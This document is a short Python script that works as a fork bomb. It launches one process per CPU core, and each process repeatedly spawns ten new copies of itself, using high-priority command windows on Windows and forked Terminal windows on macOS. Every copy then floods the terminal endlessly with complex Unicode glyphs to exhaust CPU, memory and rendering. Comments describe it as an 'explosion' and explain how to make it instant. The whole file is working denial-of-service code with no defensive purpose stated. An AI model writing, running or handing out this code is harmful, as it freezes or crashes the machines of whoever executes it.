import os
import sys
import subprocess
import platform
import multiprocessing
import random
import time

# HD Character Block - High-definition Unicode shapes that stress the GPU
# These characters require complex text shaping and high VRAM usage to render
HD_UNICODE = (
    "𒐫" * 30 + 
    "𒈙" * 30 + 
    "꧅" * 30 + 
    "𓀐" * 30
).encode('utf-8')

def execution_loop():
    """Main logic: Spawns 10 clones and then floods the terminal window."""
    script_path = os.path.abspath(__file__)
    current_os = platform.system()

    # Generation Trigger: Spawn 10 children
    for _ in range(10):
        try:
            if current_os == "Windows":
                # '/high' priority forces the OS to prioritize this lag over UI responsiveness
                subprocess.Popen(f'start /high cmd /c python "{script_path}"', shell=True)
            
            elif current_os == "Darwin": # macOS
                # os.fork() bypasses the 'open' command UI throttle
                pid = os.fork()
                if pid == 0:
                    # Target Terminal.app directly for a new window
                    os.execlp("osascript", "osascript", "-e", 
                              f'tell application "Terminal" to do script "python3 {script_path}"')
        except:
            # If the process table is full, keep trying
            pass

    # The Render Flood: Forces FPS loss by flooding the GPU buffer
    while True:
        # sys.stdout.buffer is faster than print() because it bypasses encoding checks
        sys.stdout.buffer.write(HD_UNICODE + b"\n")

if __name__ == "__main__":
    # Safety: Remove this sleep to make the explosion instant
    time.sleep(1)

    # Use all CPU cores to start the first wave of the explosion
    # This turns 1 launch into (Cores * 10) launches immediately
    for _ in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=execution_loop)
        p.start()

    # Ensure the main process also participates
    execution_loop()